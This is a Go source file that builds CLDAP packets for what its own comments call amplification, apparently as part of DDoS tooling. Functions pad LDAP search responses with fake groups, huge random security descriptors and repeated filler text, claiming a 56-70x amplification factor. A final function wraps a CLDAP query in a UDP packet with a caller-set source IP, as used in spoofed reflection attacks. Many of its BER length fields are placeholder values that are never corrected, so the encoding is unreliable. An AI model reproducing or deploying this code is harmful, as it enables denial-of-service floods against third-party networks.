package protocol

import (
	"bytes"
	"math/rand"
	"strconv"
	"strings"
)

// CLDAPResponseBuffer generates CLDAP protocol responses
// Amplification factor: 56-70 times
// Returns multiple response packets for cyclic sending
func CLDAPResponseBuffer() [][]byte {
	// Create multiple response packets for cyclic sending
	responses := make([][]byte, 0, 5)
	
	// Basic user object packet
	baseObjectResponse := generateCLDAPBaseResponse()
	responses = append(responses, baseObjectResponse)
	
	// Group membership packet (usually large)
	groupMembershipResponse := generateCLDAPGroupMembershipResponse()
	responses = append(responses, groupMembershipResponse)
	
	// Security descriptor packet (very large)
	securityResponse := generateCLDAPSecurityResponse()
	responses = append(responses, securityResponse)
	
	// Domain controller information packet
	dcInfoResponse := generateCLDAPDomainControllerResponse()
	responses = append(responses, dcInfoResponse)
	
	// Additional amplification packet
	ampResponse := generateCLDAPAmplificationResponse()
	responses = append(responses, ampResponse)
	
	return responses
}

// generateCLDAPBaseResponse generates a basic user object information packet
func generateCLDAPBaseResponse() []byte {
	var buf bytes.Buffer
	
	// LDAP message structure
	// SEQUENCE Tag
	buf.WriteByte(0x30)
	// Total length placeholder
	buf.Write([]byte{0x84, 0x00, 0x01, 0x00, 0x00})
	
	// messageID (INTEGER)
	messageID := rand.Intn(65535)
	buf.Write([]byte{0x02, 0x02})
	buf.Write([]byte{byte(messageID >> 8), byte(messageID)})
	
	// SearchResultEntry tag
	buf.Write([]byte{0x64})
	// Length placeholder
	buf.Write([]byte{0x84, 0x00, 0x00, 0xFF, 0x00})
	
	// objectName (OCTET STRING)
	objectName := "dc=example,dc=com"
	buf.Write([]byte{0x04, byte(len(objectName))})
	buf.Write([]byte(objectName))
	
	// attributes (SEQUENCE)
	buf.Write([]byte{0x30})
	// Length placeholder
	buf.Write([]byte{0x84, 0x00, 0x00, 0xF0, 0x00})
	
	// Add basic user object information
	
	// Add object class
	addCLDAPAttribute(&buf, "objectClass", []string{
		"top", "person", "organizationalPerson", "user", "computer"})
	
	// Add user account control information
	addCLDAPAttribute(&buf, "userAccountControl", []string{"4096"})
	
	// Add unique identifier
	addCLDAPAttribute(&buf, "objectGUID", []string{generateRandomHexString(32)})
	
	// Add SID
	addCLDAPAttribute(&buf, "objectSid", []string{generateRandomHexString(28)})
	
	// Add DN
	dn := "CN=DESKTOP-" + generateRandomHexString(8) + ",OU=Computers,DC=example,DC=com"
	addCLDAPAttribute(&buf, "distinguishedName", []string{dn})
	
	// Add SAM account name
	samAccountName := "DESKTOP-" + generateRandomHexString(8) + "$"
	addCLDAPAttribute(&buf, "sAMAccountName", []string{samAccountName})
	
	// Add hostname
	addCLDAPAttribute(&buf, "dNSHostName", []string{
		samAccountName[:len(samAccountName)-1] + ".example.com"})
	
	return buf.Bytes()
}

// generateCLDAPGroupMembershipResponse generates a group membership packet
func generateCLDAPGroupMembershipResponse() []byte {
	var buf bytes.Buffer
	
	// LDAP message structure
	buf.WriteByte(0x30)
	buf.Write([]byte{0x84, 0x00, 0x02, 0x00, 0x00})
	
	// messageID
	messageID := rand.Intn(65535)
	buf.Write([]byte{0x02, 0x02})
	buf.Write([]byte{byte(messageID >> 8), byte(messageID)})
	
	// SearchResultEntry
	buf.Write([]byte{0x64})
	buf.Write([]byte{0x84, 0x00, 0x01, 0xFF, 0x00})
	
	// objectName
	objectName := "cn=groups,dc=example,dc=com"
	buf.Write([]byte{0x04, byte(len(objectName))})
	buf.Write([]byte(objectName))
	
	// attributes
	buf.Write([]byte{0x30})
	buf.Write([]byte{0x84, 0x00, 0x01, 0xF0, 0x00})
	
	// Add group memberships - create many groups for amplification
	groupMemberships := []string{}
	for i := 0; i < 100; i++ {
		groupMemberships = append(groupMemberships, 
			"CN=Group"+strconv.Itoa(i)+",OU=Security Groups,DC=example,DC=com")
	}
	addCLDAPAttribute(&buf, "memberOf", groupMemberships)
	
	// Add group description information
	for i := 0; i < 20; i++ {
		addCLDAPAttribute(&buf, "groupType"+strconv.Itoa(i), []string{
			"Universal, Security Enabled (" + strconv.Itoa(i*8+2147483652) + ")"})
	}
	
	return buf.Bytes()
}

// generateCLDAPSecurityResponse generates a security descriptor packet
func generateCLDAPSecurityResponse() []byte {
	var buf bytes.Buffer
	
	// LDAP message structure
	buf.WriteByte(0x30)
	buf.Write([]byte{0x84, 0x00, 0x03, 0x00, 0x00})
	
	// messageID
	messageID := rand.Intn(65535)
	buf.Write([]byte{0x02, 0x02})
	buf.Write([]byte{byte(messageID >> 8), byte(messageID)})
	
	// SearchResultEntry
	buf.Write([]byte{0x64})
	buf.Write([]byte{0x84, 0x00, 0x02, 0xFF, 0x00})
	
	// objectName
	objectName := "cn=security,dc=example,dc=com"
	buf.Write([]byte{0x04, byte(len(objectName))})
	buf.Write([]byte(objectName))
	
	// attributes
	buf.Write([]byte{0x30})
	buf.Write([]byte{0x84, 0x00, 0x02, 0xF0, 0x00})
	
	// Add security descriptors - these are usually very large and can be used for amplification
	securityDescriptors := make([]string, 5)
	for i := 0; i < 5; i++ {
		securityDescriptors[i] = generateRandomHexString(4096) // A large security descriptor
	}
	addCLDAPAttribute(&buf, "nTSecurityDescriptor", securityDescriptors)
	
	return buf.Bytes()
}

// generateCLDAPDomainControllerResponse generates a domain controller information packet
func generateCLDAPDomainControllerResponse() []byte {
	var buf bytes.Buffer
	
	// LDAP message structure
	buf.WriteByte(0x30)
	buf.Write([]byte{0x84, 0x00, 0x00, 0x80, 0x00})
	
	// messageID
	messageID := rand.Intn(65535)
	buf.Write([]byte{0x02, 0x02})
	buf.Write([]byte{byte(messageID >> 8), byte(messageID)})
	
	// SearchResultEntry
	buf.Write([]byte{0x64})
	buf.Write([]byte{0x84, 0x00, 0x00, 0x70, 0x00})
	
	// objectName
	objectName := "cn=domaincontroller,dc=example,dc=com"
	buf.Write([]byte{0x04, byte(len(objectName))})
	buf.Write([]byte(objectName))
	
	// attributes
	buf.Write([]byte{0x30})
	buf.Write([]byte{0x84, 0x00, 0x00, 0x60, 0x00})
	
	// Add service principal names (SPNs) - these are usually large
	spns := []string{
		"HOST/dc1.example.com",
		"HOST/dc1",
		"E3514235-4B06-11D1-AB04-00C04FC2DCD2/4583ad75-f546-4138-9689-b20dd75faef0/example.com",
		"ldap/dc1.example.com/example.com",
		"ldap/dc1.example.com",
		"ldap/dc1",
		"ldap/dc1.example.com/DomainDnsZones.example.com",
		"ldap/dc1.example.com/ForestDnsZones.example.com",
		"TERMSRV/dc1.example.com",
		"TERMSRV/dc1",
		"DNS/dc1.example.com",
		"GC/dc1.example.com/example.com",
		"RestrictedKrbHost/dc1.example.com",
		"RestrictedKrbHost/dc1",
	}
	addCLDAPAttribute(&buf, "servicePrincipalName", spns)
	
	// Add operating system information
	addCLDAPAttribute(&buf, "operatingSystem", []string{"Windows Server 2019"})
	addCLDAPAttribute(&buf, "operatingSystemVersion", []string{"10.0 (17763)"})
	addCLDAPAttribute(&buf, "operatingSystemServicePack", []string{"Service Pack 1"})
	
	return buf.Bytes()
}

// generateCLDAPAmplificationResponse generates an additional amplification packet
func generateCLDAPAmplificationResponse() []byte {
	var buf bytes.Buffer
	
	// LDAP message structure
	buf.WriteByte(0x30)
	buf.Write([]byte{0x84, 0x00, 0x04, 0x00, 0x00})
	
	// messageID
	messageID := rand.Intn(65535)
	buf.Write([]byte{0x02, 0x02})
	buf.Write([]byte{byte(messageID >> 8), byte(messageID)})
	
	// SearchResultEntry
	buf.Write([]byte{0x64})
	buf.Write([]byte{0x84, 0x00, 0x03, 0xFF, 0x00})
	
	// objectName
	objectName := "cn=amplification,dc=example,dc=com"
	buf.Write([]byte{0x04, byte(len(objectName))})
	buf.Write([]byte(objectName))
	
	// attributes
	buf.Write([]byte{0x30})
	buf.Write([]byte{0x84, 0x00, 0x03, 0xF0, 0x00})
	
	// To maximize amplification, add some attributes with long values
	for i := 0; i < 10; i++ {
		attrName := "customAttribute" + strconv.Itoa(i)
		attrValues := []string{strings.Repeat("Long value for amplification. ", 500)}
		addCLDAPAttribute(&buf, attrName, attrValues)
	}
	
	return buf.Bytes()
}

// addCLDAPAttribute adds an LDAP attribute to the buffer
func addCLDAPAttribute(buf *bytes.Buffer, attrType string, attrValues []string) {
	// Attribute sequence
	buf.Write([]byte{0x30})
	
	// Length placeholder
	attrLen := 2 + len(attrType) + 2
	for _, val := range attrValues {
		attrLen += 2 + len(val)
	}
	
	if attrLen < 128 {
		buf.WriteByte(byte(attrLen))
	} else if attrLen < 256 {
		buf.Write([]byte{0x81, byte(attrLen)})
	} else {
		buf.Write([]byte{0x82, byte(attrLen >> 8), byte(attrLen)})
	}
	
	// Attribute type
	buf.Write([]byte{0x04, byte(len(attrType))})
	buf.Write([]byte(attrType))
	
	// Attribute value set
	buf.Write([]byte{0x31})
	
	// Value set length
	valuesLen := 0
	for _, val := range attrValues {
		valuesLen += 2 + len(val)
	}
	
	if valuesLen < 128 {
		buf.WriteByte(byte(valuesLen))
	} else if valuesLen < 256 {
		buf.Write([]byte{0x81, byte(valuesLen)})
	} else {
		buf.Write([]byte{0x82, byte(valuesLen >> 8), byte(valuesLen)})
	}
	
	// Individual values
	for _, val := range attrValues {
		if len(val) < 128 {
			buf.Write([]byte{0x04, byte(len(val))})
		} else if len(val) < 256 {
			buf.Write([]byte{0x04, 0x81, byte(len(val))})
		} else {
			buf.Write([]byte{0x04, 0x82, byte(len(val) >> 8), byte(len(val))})
		}
		buf.Write([]byte(val))
	}
}

// generateRandomHexString generates a random hexadecimal string of the specified length
func generateRandomHexString(length int) string {
	const hexChars = "0123456789ABCDEF"
	result := make([]byte, length)
	for i := range result {
		result[i] = hexChars[rand.Intn(len(hexChars))]
	}
	return string(result)
}

func CLDAPPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
	payload := []byte{
		0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04, 0x00, 0x0a, 0x01, 0x00,
		0x0a, 0x01, 0x00, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00,
		0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x63, 0x6c, 0x61, 0x73,
		0x73, 0x30, 0x00,
	}    
	return BuildUDPPacket(srcIP, dstIP, srcPort, dstPort, payload)
}